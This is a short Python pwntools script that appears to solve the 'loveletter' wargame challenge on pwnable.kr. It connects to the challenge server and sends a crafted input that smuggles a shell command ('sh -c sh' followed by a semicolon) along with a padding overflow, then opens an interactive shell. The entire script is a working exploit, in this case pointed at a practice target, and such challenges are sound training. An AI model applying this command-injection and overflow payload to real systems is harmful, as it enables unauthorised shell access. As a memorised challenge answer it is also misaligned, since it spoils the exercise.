from pwn import *

r = remote("pwnable.kr", 9034)
# r = process("./loveletter")

r.sendline(b"nv sh -c sh " + b";" + cyclic(256 - 12 - 3) + b"\x01")
r.interactive()
